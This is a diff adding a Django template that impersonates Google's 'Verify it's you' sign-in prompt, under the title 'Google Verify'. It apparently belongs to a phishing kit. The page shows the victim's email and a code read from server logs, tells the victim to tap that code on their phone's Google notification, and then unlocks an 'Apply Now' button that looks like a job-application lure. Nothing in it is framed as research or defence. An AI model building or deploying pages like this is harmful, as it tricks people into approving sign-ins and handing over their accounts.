@@ -1,0 +1,176 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
+  <title>Google Verify</title>
+
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: #fff;
+      margin: 0;
+    }
+
+    .container {
+      /* max-width: 320px; */
+      text-align: center;
+      color: #333;
+      width: 350px;
+    padding: 30px;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    .google-logo {
+      margin-bottom: 10px;
+    }
+
+    .google-logo span {
+      font-size: 24px;
+      font-weight: bold;
+    }
+
+    .google-logo .blue { color: #4285f4; }
+    .google-logo .red { color: #ea4335; }
+    .google-logo .yellow { color: #fbbc05; }
+    .google-logo .green { color: #34a853; }
+
+    h2 {
+      font-weight: normal;
+      margin: 10px 0;
+    }
+
+    .desc {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 20px;
+    }
+
+    .email {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 14px;
+      margin: 10px 0;
+      color: #444;
+    }
+
+    .email-icon {
+      margin-right: 8px;
+      font-size: 18px;
+    }
+
+    .code-input {
+      font-size: 48px;
+      font-weight: bold;
+      text-align: center;
+      border: none;
+      border-bottom: 2px solid #ccc;
+      width: 100px;
+      margin: 20px auto;
+      display: block;
+      outline: none;
+    }
+
+    .code-input:focus {
+      border-bottom-color: #4285f4;
+    }
+
+    .device-msg {
+      font-size: 14px;
+      margin-bottom: 30px;
+    }
+
+    .resend {
+      font-size: 12px;
+      color: #bbb;
+      cursor: pointer;
+    }
+
+    .resend:hover {
+      color: #888;
+    }
+
+    .linkup{
+    background-color: #1a73e8;
+    color: white;
+    border: none;
+    padding: 10px 25px;
+    font-size: 14px;
+    border-radius: 20px;
+    cursor: pointer;
+    text-decoration: none;
+  }
+
+   .linkup.disabled {
+      opacity: 0.5;
+      pointer-events: none;
+      cursor: default;
+   }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="google-logo">
+      <span class="blue">G</span><span class="red">o</span><span class="yellow">o</span><span class="blue">g</span><span class="green">l</span><span class="red">e</span>
+    </div>
+    <h2>Verify it’s you</h2>
+    <p class="desc resend">To help keep your account safe, Google wants to make sure it’s really you trying to sign in</p>
+
+    <div class="email">
+      <span class="email-icon"><i class="fa-light fa-circle-user"></i></span>
+      {% if user %}
+      <span>{{ user.email }}</span>
+    </div>
+
+    <!-- Input box instead of static number -->
+      {% if logs %}
+ 
+   
+      {% for log in logs %}
+       
+    <input type="text" class="code-input" value="{{ log.code }}" readonly />
+
+      {% endfor %}
+    </ul>
+ {% else %}
+    <strong style="color: red;">No code yet. Please refresh the page to get confirmation code.</strong>
+  {% endif %}
+
+{% endif %}
+
+    <div class="device-msg resend">
+      <strong>Check your device</strong><br/>
+      Google sent a notification to your mail. Tap <strong>Yes</strong> on the notification, then tap <strong>{{ log.code }}</strong> on your phone to verify it's you.
+    </div>
+<!-- 
+    <a  href="{% url 'view' user.id %}?email={{ user.email|urlencode }}" class="linkup">
+  Apply Now
+</a> -->
+
+    {% if allow_apply %}
+      <a href="{% url 'view' user.id %}?email={{ user.email|urlencode }}" class="linkup">Apply Now</a>
+    {% else %}
+      <a class="linkup disabled" aria-disabled="true" tabindex="-1">Apply Now</a>
+    {% endif %}
+
+    <br> <br>
+
+    <small class="resend">refresh to  activate the Apply Now button</small>
+
+<br> <br>
+
+    <div class="resend" onclick="alert('Resend link clicked')">Resend it</div>
+  </div>
+</body>
+</html>
